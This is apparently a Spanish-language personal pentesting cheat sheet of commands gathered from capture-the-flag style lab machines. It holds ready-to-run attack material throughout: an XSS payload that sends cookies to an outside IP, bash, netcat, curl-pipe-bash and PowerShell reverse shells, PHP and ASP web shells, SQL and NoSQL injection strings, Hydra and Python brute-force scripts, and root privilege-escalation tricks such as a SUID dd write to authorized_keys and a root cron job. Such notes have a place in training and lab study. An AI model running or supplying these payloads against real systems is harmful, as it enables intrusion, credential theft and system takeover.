# Acordeon

## S4vitar extractports


```bash

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}

```

## echo -n

Siempre

## APIS

Siempre checa si se pueden acceder a los documentos de la api encontre una api con documentos accessibles 

```
api/ejemplo/v2/api-docs
```

## Hydra 

Ejemplos hay que practicar

```

 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 -s 5000 -v http-post-form "/login/:user=^USER^&password=^PASS^:Invalid Password"

-f: Este parámetro le dice a Hydra que finalice el ataque después de que se encuentre la primera contraseña válida.

 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 -s 5000 -v http-post-form "/login/:user=^USER^&password=^PASS^:Invalid Password"
```

basic auth

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.11.106 http-get /

```


## Ver particiones de Linux (como Mi Pc en Windows)

Es mas o menos un equivalente pero para la linea de comandos.

![image](https://github.com/gecr07/Acordeon/assets/63270579/38ec2e62-1fc1-428e-b6d2-f41167dcdea8)


```
fdisk -l
```

### debugfs

debugfs es un sistema de archivos especial disponible en el núcleo Linux desde la versión 2.6.10-rc3.​ Si te encuentras en el grupo disk practicamente tienes acceso a cualquier directorio del sistema

```
debugfs /dev/sda1
```

### Tamaño de un archivo (Diks usage)

Para ver el tamaño de un archivo usa

```
du -h root.txt
```

## Ver espacio sobrante (Disk Free supongo)

 muestra la cantidad de espacio en disco usado y disponible en los sistemas de archivos montados. Es útil para obtener una vista rápida de la disponibilidad de espacio en diferentes particiones o dispositivos de almacenamiento.

```
df -h
```

## SSH file trasfer

Para poder trasferir datos del iphone a windows cuando uno tiene un usuario y password de ssh usa:

```
scp root@192.168.0.27:/tmp/rmq2.sqlite ./
```

Pero que pasa cuando es alrrevez de windows al iphone es asi:

```
scp .\bbvanetc.ipa root@192.168.123.87:/tmp/
```






## Web Inyeccion de comandos

Siempre que pruebes con Burp Suite o sin el un command injection procura probar estas convinaciones:

```
;id
| id
|| id
# ire añadiendo mas
```

### Psy Shell v0.9.9

 PsySH is a runtime developer console, interactive debugger and REPL for PHP. Algunas veces o mas bien siempre se tienen bloqueadas funciones de php que permiten ejecutar comandos y esto se puede ver con el phpinfo().

 ![image](https://github.com/gecr07/Acordeon/assets/63270579/c0161dcb-5260-466a-9409-7df413162e04)

Cuando tengas este escenario puedes leer y escribir archivos(si es que no esta bloqueado como arriba) de este modod puedes conseguir claves de ssh o bien meter tu autorized keys para poder conectarte con tu id_rsa. Los siguientes comandos son:

```
getcwd()

get_current_user()

system('echo test')

scandir("/home")

file_get_contents("/etc/os-release")

echo file_get_contents("/home/nairobi/ca.key")

To show env variables use the same var example

show $tokyo

file_put_contents('/home/dali/.ssh/authorized_keys', $publickey)


```

## Abuse /etc/passwd

Si tienes manera de sobre escribir el archivo /etc/passwd basicamente te podrias ahcer del usuario root poniendo la contraseña que tu elijas para lo cual usa el siguiente comando (-1 para MD5, -5 SHA256, -6 SHA512 etc)

<img width="502" alt="image" src="https://github.com/user-attachments/assets/d3f4a92b-7b8d-456f-b243-14895dbf2b9a">


```
openssl passwd -5 -salt tuSal tuContraseña # Puede ser lo mismo el salt como la contraseña

nombre_de_usuario: el nombre de la cuenta del usuario.
x: indica que la contraseña del usuario se almacena en /etc/shadow.
UID: el número de identificación del usuario.
GID: el número de identificación del grupo principal del usuario.
información_completa: generalmente el nombre completo del usuario o una descripción.
directorio_home: el directorio inicial del usuario.
shell_predeterminada: la shell que se inicia al ingresar el usuario.

```



## SQLite

Kali ya trae un paquete para poder abrir este tipo de archivo es sqlite3 

```
sqlite3 db.sqlite

```
Una vez dentro de la herramienta, puedes usar comandos SQL para ver las tablas (.tables), esquemas (.schema) y realizar consultas (SELECT * FROM tabla;).

## XSS

Para robar cookies usa:

```
<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
```

Cabe destacar que la funcion btoa es para pasar a base64 ideal si no sabemos que caracters podriamos perder...


> https://github.com/payloadbox/xss-payload-list

## Probar limites

Para probar limites y saber donde esta el limite como para los BoF usa los patrones.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255 
```

Para saber el limite metemos los ultimos 4 bytes donde se sobre escribio el EIP o donde se corto el string. Ojo puede funcionar de dos maneras


```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q h7Ah


/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 255 -q h7Ah 

```


## SNMP - UDP 161

Cuando tengas este puerto abierto intenta ver si puedes sacar informacion con snmpwalk. Puedes igual intentar adivinar el nombre de las comunidades mediante fuerza bruta 


```
snmpwalk -v 2c -c public 10.10.10.116

```

## IKE - UDP 500

UDP 500 is used for Internet Key Exchange (IKE), which is used to establish an IPSEC VPN. There is some recon I can do on the IKE using ike-scan.

```
ike-scan -M 10.10.10.116
```

Existen 2 versiones de este servicio

```
ike-scan -M --ikev2 10.10.10.116
```

## Priv escalation con /bin/dd SUID

Pero si tienes este con permisos SUID te permite escribir lo que sea porque es muy poderso.

El comando dd tiene una sintaxis que se basa en operandos del tipo keyword=value. Aquí hay algunos de los operandos más comunes:

if= especifica el archivo de entrada (Input File).

of= especifica el archivo de salida (Output File).

bs= especifica el tamaño del bloque en bytes.

count= número de bloques a copiar.

skip= número de bloques a saltar en el archivo de entrada.

seek= número de bloques a saltar en el archivo de salida.

sabiendo esto entonces podemos escribir la authorized_keys de root y conectarnos como root.

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." > /tmp/mykey.pub

# Tiene que estar con estos permisos o no te va a dejar ahcer nada
chmod 600 /root/.ssh/authorized_keys

/bin/dd if=/tmp/mykey.pub of=/root/.ssh/authorized_keys oflag=append conv=notrunc


Verifica si si se escribio esto solo va a leer el contenido

/bin/dd if=/root/.ssh/authorized_keys

```


En el ámbito forense, dd se utiliza para crear imágenes bit a bit de dispositivos de almacenamiento. Esto es crucial para la preservación de evidencia digital en un estado prístino, ya que permite a los investigadores trabajar con una copia exacta del dispositivo sin alterar el original. Este proceso captura todos los datos del dispositivo, incluidos los archivos borrados y los espacios no asignados, que pueden contener información valiosa para la investigación.

```
dd if=/dev/sda of=/path/to/image.img bs=4M

#Block Size (bs): Define el tamaño de cada bloque de datos que se lee y luego se escribe en una sola operación. En el ejemplo bs=4M, se indica que dd debe leer y escribir datos en bloques de 4 megabytes cada uno.


```

## Palabras clave

Algunas palabras clave al momento de buscar exploits

```
github
github exploit
Authentication-Bypass
Command injection
```

## Linux File Name Length


En sistemas de archivos comunes en Linux como ext3, ext4, y otros, el límite de longitud para nombres de archivo suele ser de *** 255 caracteres. *** Esto incluye solo el nombre del archivo en sí, no la ruta completa. La restricción de 255 caracteres es muy común en muchos sistemas de archivos y está diseñada para asegurar compatibilidad y eficiencia en el manejo de archivos.

## Revisar mails

Para revisar los mails locales usa

```
cat /var/mail/tu_usuario
```

## Openssl encrypted files

Existe manera de encriptar informacion tiene muchos posibles algoritmos de cifrados. Por ejemplo vamos a encriptarun archivo:

```
openssl aes-256-cbc -in file.txt -out file.crypted
```
![image](https://github.com/gecr07/Acordeon/assets/63270579/19dd4041-ce88-4168-842c-95f230a85692)

Y pues para desencriptar seria

```
openssl aes-256-cbc -d -in file.txt -out file.crypted
```
Para utilizar esta herramienta( que tarda mucho) porque con la lista que le des pues prueba cada una de los algoritmos de cifrado.  Existe una herramienta que prueba todos y cada uno de los tipos de cifrado.

```
python3 brute.py /usr/share/wordlists/rockyou.txt ciphers.txt .drupal.txt.enc

```

> https://github.com/HrushikeshK/openssl-bruteforce

Ahora si ya sabes que tipo de algoritmo de cifrado este es un script de s4vitar
```

#!/bin/bash

echo -e "Probando  passwords\n"

for password in $(cat rockyou.txt); do


openssl aes-256-cbc -d -in .drupal -out drupal.decrypt -pass pass:$password &>/dev/null &

if [ "$(echo $?)" == "0" ]; then
        echo -e "\n[+] La password es: $password"
        exit 0
fi
done;wait
```

## Zone Transfer 

Es importante resaltar que tienes que intentar este ataque a TODOS los sub dominios que encuentres porque en uno si puede jalar y darte mas subdominios.

```
dig axfr friendzone.red @10.129.24.12
```

### Proxy

Para poder pasar por un proxy usa:

```
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 
```
> https://github.com/gnebbia/hydra_notes


## HASHES

Algunos de los algoritmos de hashing más comunes en términos de la cantidad de caracteres en su representación hexadecimal. En la mayoría de los casos, especialmente cuando trabajas con texto en codificaciones como ASCII o UTF-8 (para caracteres del inglés básico y muchos otros caracteres comunes), 1 byte equivale a 1 carácter. Por lo tanto, 255 bytes equivalen a 255 caracteres.

![image](https://github.com/gecr07/Acordeon/assets/63270579/4d084a43-481c-4315-8437-a8abba956c7b)

Para comprobar el tamaño de hashes saca primero el hash y despues saca la cuenta

```bash

# MD5
md5sum

echo -n "60b725f10c9c85c70d97880dfe8191b3" | wc -c

# 32

# SHA256

sha256sum

echo -n "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb" | wc -c

# 64

```

## APACHE

Las rutas de apache que generalmente se utilizan son:

```
/etc/apache2/sites-enabled/
```

Existen versiones de apache no solo la normal ademas esas versiones una de ellas es la Apache OFBiz otras son Apache Tomcat y Apache Hadoop entre muchas otras. 

```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I

```

> Exacto, el formato del hash que has mencionado, $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I, no corresponde a un estándar reconocido como MD5, SHA-256, o similares que suelen tener estructuras más definidas y reconocibles.

> Este hash parece ser específico de alguna aplicación o sistema, como Apache OFBiz en tu caso, donde puede que se haya implementado un esquema propio para el manejo de hashes, posiblemente incluyendo algún tipo de "sal" (un dato adicional para aumentar la seguridad del hash) o algún método específico de iteración o modificación.

> [https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker](https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker.git)

Para usar es:

```
python3 OFBiz-crack.py --hash-string '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I' --wordlist /usr/share/wordlists/rockyou.txt
```

### Enumeracion de usuarios apache /apos;UserDir/apos;

La directiva UserDir permite a los usuarios alojar páginas web en sus directorios personales dentro del servidor. Por ejemplo, si un usuario tiene el nombre "john", y UserDir está habilitado, se podría acceder a los contenidos del directorio personal del usuario a través de un URL como:

```

http://example.com/~john.

```

Aunque los directorios esten protegidos y manden una peticion 403 de no exitir el usuario mandaria el error 404 lo cual permitiria enumerar usuarios.

### Archivos de configuracion

El archivo de configuración de Apache (usualmente **httpd.conf** o **apache2.conf**).

## Ver errores stdout

Para redirigir el stderr al stdout usa:

```
# Siempre que ejecutes comando en una barra de anvegacio usa %26 para url encodear el &
comando ( que no genera output) 2>&1
```

## Java

Para ejecutar un jar usa:

```
sudo java -jar TLauncher-*.jar
```

Para descompilar he utilizado esta herramienta ya sabes sirve para ver el codigo en java es bastante util:

```
sudo apt install jd-gui

jd-gui 

```

## SSH

Para poder usar la llave privada que tu mismo creaste has lo siguiente:

```
### Kali
ssh-keygen

```

Eso crea la llave publica y privada ahora pon la llave publica en el directorio authorized_keys en la maquina victima

```
cat id_ed25519.pub | tr -d '\n' | xclip -sel clip
```

Finalmente en la maquina target

```
cd .ssh
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys

ssh -i id_rsa strapi@10.10.14.57 
```

Probar usuarios de ssh ya cuando tienes una id_rsa

```

for i in $(cat u.txt); do ssh -oBatchMode=yes -i id_rsa $i@10.129.242.42; done

```

## Si no esta la carpeta .ssh de root creala

Si no se encuntra tu puedes crearla

```
chmod 700 /root/.ssh
touch /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
pwd      

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTEQ/7hn6SuJDX5+bl6tk/ kai@kai" > authorized_keys 
```


### SSH config

Para checar la configuracion del ssh el archivo esta en la siguiente ruta

```
cat /etc/ssh/sshd_config
```

## CronJob

Para hacer que jale un cron ponlo en la carpeta /etc/cron.d

```
* * * * * root sh /tmp/reverse.sh
```

## GLIBC

Para verificar que version de glibc tiene el sistema que estas trabajando y en el caso de tener que compilar un programa es util

```
ldd --version
```

## Nmap

Para tirarle categorias de scripts para probar vulnerabilidades

```
nmap --script "vuln and safe" -p443 10.10.10.17.1 -oN Scan
```

Escanear solo un rango de puertos.

```
nmap -p 1-10000 $target
```

## Linpeas

Usa esto en caso de que no sepas como escalar privilegios.

```
#Target
./linpeas.sh > out.txt

cat out.txt > /dev/tcp/IP/port

#Kali

nc -lvpn port > out.txt
```

## Github

Puede ser que se guarden claves en los diferentes commits que se hacen en un proyecto de git.

```
#Para ver toda la actividad

git log

## Para ver las ramas

git branch

# Para ver los cambios en un commit en especifico

git show <commit-hash>


```


## Linux capabliities


En Linux, las "capabilities" son un conjunto de privilegios más granulares que permiten a los procesos ejecutarse con ciertos privilegios sin necesidad de otorgarles todos los privilegios de superusuario (root). Esto proporciona una forma de controlar los permisos de manera más precisa y reducir el riesgo de seguridad asociado con la ejecución de procesos con privilegios completos de root.

Para ver las capabilities usa:

```
getcap -r / 2>/dev/null

## Por ejemplo esta la use en la maquina nunchucks

/usr/bin/perl = cap_setuid+ep

# Para escalar privilegios

#!/usr/bin/perl
use POSIX;
setuid(0);
exec "/bin/bash";

```

## Stenografia

```
strings onm.jpg -n 10 #Lineas que tengan mas de 10 caracteres

```

Para ver los metadatos

```
exiftool omg.jpg
```

Datos escondidos

```
steghide info omg.jpg
```
Existen herramientas de fuenrza bruta que ayudan a esto busca "steghide brute force". Para poder extraer un archivo que esta escondido de una imagen si tienes un password.

```
steghide extract -sf Untitled.jpeg -p UPupDOWNdownLRlrBAbaSSss
```

## Host Discovery

Usa este one liner para cuando tengas problemas con el output jala en donde sea:

```
for i in {1..254}; do ping -c 1 -W 1 172.19.0.$i | grep "64 bytes" & done

## Todavia mas sencillo

for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;

```

## Scan ports

Para el one liner que escanea todos los puertos lo mas sencillo posible

```
 for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null  
```



## Fully TTYs

```bash

script /dev/null -c bash
CTRL+Z
stty -echo raw;fg
    reset
export TERM=xterm
export SHELL=bash
stty size # por si no sabes las medidas de tu pantalla
stty rows  51 columns 189 # Patalla grande
stty rows  40 columns 167 # pantalla de lab viejita
```

## Spawn shells

Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 

```bash

bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
bash -c "bash -i >& /dev/tcp/IP/port 0>&1"

```
***ASP*** simple shell

```
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

http://10.129.228.122/upload/shell.asp?cmd=whoami

```

### Python Fully TTY

> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

````python 

python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

````

Con nc si es que existe en la maquina enviate una reverseshell

```
nc 10.90.60.80 4444 -e /bin/bash
```

Puedes usar curl para ejecutar una shell reversa aprovechandote de curl:

```
#index.html
# python3 -m http.server 80
#!/bin/bash

bash -i >& /dev/tcp/IP/port 0>&1

#target

curl http:/10.10.14.57/ |bash


```

Powershell one liner Invoke-PowerShellTcpOneLine.ps de Nishang

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Para tener una consola medianamente interactiva en windows siempre usa...

```
rlwrap nc -lvnp 443
```

## Firefox Decrypt Saved passwd

Para poder obtener todos los passwords que estan guardados en un perfil usa

> https://github.com/lclevy/firepwd

## Sudo

```
sudo -u asuser whoami

```

## Mount (montar un share)

De nuevo para no estar listando cada uno de los directorios monta mejor.

```
mkdir /mnt/smb
mount -t cifs //10.0.1.1/ACCT /mnt/smb -o username=Finance,password=Acc0unting,rw #Puedes poner solo r o ambas read write.
```

### Mount

Si pones solamente moun te muestra todo lo que esta montado en el sistema.

```
mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)

####

En resumen, esta línea te está diciendo que hay un sistema de archivos del tipo ext4 en el dispositivo /dev/sda1, montado en el directorio /home/augustus con permisos de lectura y escritura, y con ciertas opciones respecto a los tiempos de acceso y el manejo de errores.

```

## Node express etc

Muchas veces esto trabaja con mongo y las vulnerabilidades reciden el los modulos que usa la propia app. Algunos content types

```
Content-Type: application/json

{
  "user": "admin",
  "password": "whaever"
}

Content-Type: text/html; charset=UTF-8
Content-Type: text/plain
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Type: application/octet-stream


```

## Mongo

Para conectarte a una base de datos mongo(y tambien con la de mysql) sin necesitad de usuario y password

```
mongo mongodb://localhost/blog

## Si tienes credenciales

mongo mongodb://usuario:contraseña@host:puerto/nombreDeLaBaseDeDatos

```

Para ver las bases de datos y tablas usa:

```
show dbs

use nombreDeLaBaseDeDatos

show collections

db.nombre_tabla.find()

```

## NodeShell

Para crear reverse shell que funcione

> https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

## NOSQL LOGINS FORMS

En los logins siempre prueba tanto inyecciones SQL como NO SQL

```
#NOSQL

{

  "user": {"$ne": "foo"},

  "password": {"$ne": "bar"}

}
```

> https://book.hacktricks.xyz/pentesting-web/nosql-injection

SQL 

```
' or '1'='1-- -

ETC
```

> https://book.hacktricks.xyz/pentesting-web/login-bypass

## Alternativa a netstat

```
ss -lnpt
```

o tambien

```
ss -ant
```

## FTP

Para conectarte

```
ftp IP
```
Para subir un archivo

```
put shell.asp
```

### FTP mount

Cuando tiene credenciales y no quieres estar buscando uno por uno(carpeta)

```
curlftpfs ftp.example.com /mnt/ftp/ -o user=username:'password',allow_other

# Cuando se termine de usar para desmontar

umount /mnt/ftp/
```

## Enum

```
lsb_release -a
systemctl-timers
watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
```

## Find 

```
find \-perm -4000 2>/dev/null #SUID

```

Buscar solo archivos dentro de una carpeta

```
find . -type f
```

Buscar arhivos solo en el la carpeta ( primer nivel) que empiecen por un punto

```
find /var/tmp -maxdepth 1 -type f -name ".*"
```

Archivos que pertenecen a un grupo

```
find / -group video 2>/dev/null
```

## SUID

```python

import os

os.system("chmod u+s /bin/bash")

```

Si en algun momento caes en una shell que sea python como la maquina Hawk usa

```
import os

os.system("whoami")
os.system("bash")

```

## Redireccionar stdout stderror

Aqui tenemos como redireccionar tanto el stdout como el stderr

```
burpsuite &>/dev/null
```

Ahora para redireccionar el stderr 

```
2>&1
```

## SQLI mysql

Para no depender de SQLMAP voy a utilizar la tabla "information_schema" esta tabla tiene informacion de usuarios privilegios etc.

Para ***enumerar usuario*** de la base de datos ( en ese momento)

```
username=masa&country=Albania' union select 1;-- -
username=masa&country=Albania' union select user();-- -
```

Para ***enumerar la base de datos*** que se esta usando en ese momento

```
username=masa&country=Albania' union select database();-- -
```

Para ***enumerar tablas*** dentro de la base de datos

```
username=masa&country=Albania' union select table_name from information_schema.tables where table_schema='registration';-- -
```
Para ***enumerar nombres de las columnas***

```
username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -
```

Para ***mostrar*** de una manera los datos que te importan

```
username=masa&country=Albania' union select group_concat(username,0x3a,userhash) from registration;-- -

0x3a son los dos puntos
```

Para ***escribir un archivo***( si es que tienens priv no olvides las comillas si no jala)

```
username=masa&country=Albania' union select "probando" into outfile "/var/www/html/probando.txt";-- -
```

Siempre prueba si tiene permisos de ejecucion de comandos asi como de escribir archivos.

## Dirsearch

Me parece una alternativa que tienes que utilizar ya que el dirbuster esta bien pero el problema es que aveces por ser tan potente no logra detectar cosas porque tira las paginas. Utiliza esta herramienta quiza antes de WFUZZ.

```
dirsearch -u https://bizness.htb
```

## Dirbuster

Esta herramienta es muy potente pero el problema es que por eso mismo puede tirar paginas.

```
dirbuster -u http://10.129.95.235/ -t 200 -l /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -r dirout.ext -e asp,aspx

```

## WFUZZ

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt http://example.com/FUZZ
## Follow redirect
-L
## Esconder por tamaño total de caracteres
--hh=totaldecaracteres

```

Para poner mas palabras y que fuzze para meter un segundo payload.

```
wfuzz -c --hc=404 -t 200 -w rockyou.txt -z list,php-html http://example.com/FUZZ.FUZ2Z
```

Para enumerar los subdominios

```
wfuzz -c -t 200 --hh=11439 -w direcbotiry23medium.txt -H "Host: FUZZ.cronos.htb"  http://example.com
wfuzz -c --hw=55 --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.silo.htb"  http://silo.htb/
```

Para poder mandar payloads de diferentes listas usa:

```
wfuzz -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -z file,/usr/share/wordlists/rockyou.txt -z file,file-extensions.txt  -p localhost:8080 http://10.129.185.202:8080/FUZZFUZ2Z.FUZ3Z 


```

WFUZZ Post request y esconder char len

```
wfuzz -c -t 200 --hh=7074  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -d "username=FUZZ&password=masa" http://falafel.htb/login.php
```

> https://www.pinguytaz.net/index.php/2019/10/18/wfuzz-navaja-suiza-del-pentesting-web-1-3/

Basic auth with session fuzz with proxy

```
wfuzz -c --hc=404  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -p localhost:8080  -H "Authorization: Basic YWRtaW46YWRtaW4="  http://driver.htb/FUZZ

```

## GOBuster

Para enumerar subdominios

```
gobuster vhost -u http://cronos.htb/ -w /subdomains.txt -t 200
```


## PHP reverse shell 


```php
<?php

echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";

?>

```
Existen variantes...

```php

<?php system($_GET['cmd']); ?>

```

Una variacion de reverse shell

```
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.80/443 0>&1'"); ?>
```

Una con nc

```
<?php system("nc 10.90.60.80 4444 -e /bin/bash"); ?>
```

## disown

Para que se abra un programa como firefox y no dependa de esa consola se pueda cerrar y no se cierre la consola que puedas seguir trabajando.

```
progrmaa &> /dev/null & disown
 
```

firefox: Es el comando para ejecutar el navegador web Firefox.

&> /dev/null: Redirige tanto la salida estándar (stdout) como la salida de error estándar (stderr) del comando firefox al dispositivo especial /dev/null. /dev/null es un dispositivo especial en sistemas Unix y Linux que se utiliza para descartar datos. Por lo tanto, este comando asegura que cualquier salida generada por Firefox se descarte y no se muestre en la pantalla o en ningún archivo de registro.

&: Este símbolo se utiliza para ejecutar el comando en segundo plano, lo que significa que el navegador Firefox se ejecutará en segundo plano y no bloqueará la terminal desde la que se lanzó.

disown: Este comando se utiliza para desvincular el proceso del terminal actual, lo que significa que el proceso Firefox continuará ejecutándose incluso si cierras la terminal desde la que lo lanzaste. Esto evita que el proceso sea terminado cuando cierras la terminal.

## mkdir crear mas de un directorio 

```bash
mkdir -p /uno/subdirectorio2/tres
```

## WhatWeb

Esta es una herramienta muy simple que te dice que cabeceras tiene pero lo interesante es que si le pones el modo -v te puede decir de donde las saca.

```
whatweb IP -v
```

## TCPDUMP

Para ponerme a la escucha en una interfaz en este caso tun0

```
sudo tcpdump -i tun0 -w Captura.cap -n -v

# -n para que evite aplicarnos la resolucion dns
```

Para poder ponernos a la escucha (solo protocolo icmp) y enviarnos pings

```
sudo tcpdump -i tun0 icmp -n

# -n: Indica a tcpdump que no realice la resolución de nombres y direcciones IP, sino que muestre directamente las direcciones numéricas
```
## TSHARK

Este es un Wireshark pero de consola los comando basicos son:

```
tshark -r Captura.cap -Y "http" 2>/dev/null
#El Y es el filtro en este caso se quiere filtrar por peticiones http
```

## Shebang

```bash
#!/bin/bash

chmod u+s /bin/bash

```
## Convertir mayusculas a minusculas y alrreves

Para hacer esta convercion usa esto:

```
tr '[:upper:]' '[:lower:]'
```

## Grep -P -E

### grep -E:

> La opción -E habilita el uso de expresiones regulares extendidas (ERE).En las expresiones regulares extendidas, ciertos caracteres especiales como +, ?, () tienen significados especiales sin necesidad de ser precedidos por un carácter de escape \.
Por ejemplo, con grep -E, puedes utilizar + para representar "uno o más repeticiones", y no necesitas escaparlo como \+.

```
grep -Ei "user|pass|note|key"

````

En el ejemplo anterior va a buscar esos strings es como or el | 

### grep -P 

> La opción -P habilita el uso de expresiones regulares de Perl (PCRE).Las expresiones regulares de Perl son más poderosas y flexibles que las expresiones regulares básicas (BRE) o extendidas (ERE).

> Permite utilizar la mayoría de las características avanzadas de Perl en las expresiones regulares, como el uso de (?...) para grupos no capturadores, lookaheads, lookbehinds, etc. Es especialmente útil si necesitas características más avanzadas que las proporcionadas por las expresiones regulares básicas o extendidas.


```
# Este ejemplo se usa el only match se activan las reg ex de perl y se escapa el punto despues se busca que despues del punto existan 40 caracteres
grep -oP '\.\w{40}'

```

Para buscar una palabra ( y que grep muestre la linea) y que inicie y acabe.

```
## -n imprime la linea
grep -n "^api$"
```

Para imprimir abajo y arriba que hay usa*** (GREP no permite mirar dentro de archivos binarios asi por asi usa cat y luego grep) ***:

```bash
cat runtime/data/derby/ofbiztenant/seg0/c180.dat | strings | grep -B 4 -A 4 "password"

cat runtime/data/derby/ofbiztenant/seg0/c180.dat | strings | grep -B 4 -A 4 "\$SHA" # Para que puedas escapar el $ usa \

```


Para ver los passwords en todos los archivos

```
grep -r "password" | less -S
```





## Enlace simbolico

Son como los accesos directos pero para linux existen otros enlaces aparte de los simbolicos los duros.

```
ln -s -f /root/root.txt index.html

ln: Es el comando para crear enlaces.
-s: Es la opción que indica que se debe crear un enlace simbólico.
-f: Es la opción que indica que, si ya existe un archivo llamado index.html, se debe sobrescribir sin preguntar.

```



## Brute Force Alternativa a cosas como Hydra

Esto es una alternativa a hydra para hacer brute force lo que si falta es ponerle hilos para que vaya mas rapido

```
#!/usr/bin/python3

import requests, pdb, sys, time, re, signal
import urllib3, threading


def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


url = 'http://monitor.bart.htb/index.php'
burp = { 'http': 'http://127.0.0.1:8080'}



def main():
	#time.sleep(10)
	s=requests.session()
	r = s.get(url)
	#print(r.text)
	csrfToken = re.findall(r'name="csrf" value="(.*?)"',r.text)[0]
	#pdb.set_trace()# l y p para ver valores.


	with open("user.txt", "rb") as users_file:
		usuarios = [linea.decode().strip() for linea in users_file]
	with open("passwords.txt", "rb") as passwords_file:
		contraseñas = [linea.decode().strip() for linea in passwords_file]
		for usuario in usuarios:
			for contraseña in contraseñas:
				#print(f"Probando: Usuario={usuario}, Contraseña={contraseña}")
				post_data = {'csrf': csrfToken,'user_name': usuario,'user_password': contraseña,'action':'Login'}
				r = s.post(url,data=post_data,proxies=burp)
				if "The information is incorrect"  not in r.text:
					print(f"Se encontro una contraseña correcta {usuario}:{contraseña}")
		
		



if __name__ == '__main__':
	main()

```





## Ascii

```
man ascii
# Por ejemplo para imprimir el guion si es un bad char

printf "\055"; echo
guion=$(printf "\055")
## Ahora por ejemplo de hacer que el / que es un bad char supongamos que  la variable env es /

comando con guiones | sed 's/\//${HOME}/g' # esto lo que hace es donde encuentre un / lo va substituir por lo que valga $HOME
```

## Python break points

Para esto se necesita importar la libreria pdb 

```python3
#pip uninstall pyelftools -y
#pip install pyelftools==0.29

 
from pwn import * 

import requests
import pdb# break point--------------------------------------------------------------------------->
import signal#USas signal para capturar el CTRL+C
import sys
import urllib3
import time# aqui se usa time.sleep
import re # explresiones regulares

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)


#CTRL+C
signal.signal(signal.SIGINT, def_handler)

main_url="https://10.129.68.239/index.php"

def executeCommand():
        s=requests.session()
        urllib3.disable_warnings()
        s.verify = False
        r = s.get(main_url)
        pdb.set_trace()#break point------------------------------------------------------------->
        #print(r.text)<


if __name__== '__main__':
#       time.sleep(10)
        executeCommand()


```

Cuando ejecutas el programa entra en una especie de depurador de consola algunos comandos son: aprieta l

![image](https://github.com/gecr07/Acordeon/assets/63270579/ef1babf7-f3be-4693-a6a3-5ea5f907c6b7)

> https://realpython.com/python-debugging-pdb/

